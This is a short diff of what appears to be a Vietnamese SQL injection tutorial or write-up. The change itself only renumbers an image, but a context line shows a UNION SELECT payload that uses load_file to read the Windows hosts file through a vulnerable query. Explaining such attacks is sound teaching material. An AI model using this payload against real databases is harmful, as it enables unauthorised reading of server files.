@@ -70,5 +70,5 @@ Mục lục:
 
 3. File hosts
 `' UNION SELECT load_file("C:/Windows/System32/Drivers/etc/hosts"),NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 #`
-![Hinh 15.](~/../img/15.png)
+![Hinh 15.](~/../img/16.png)
 
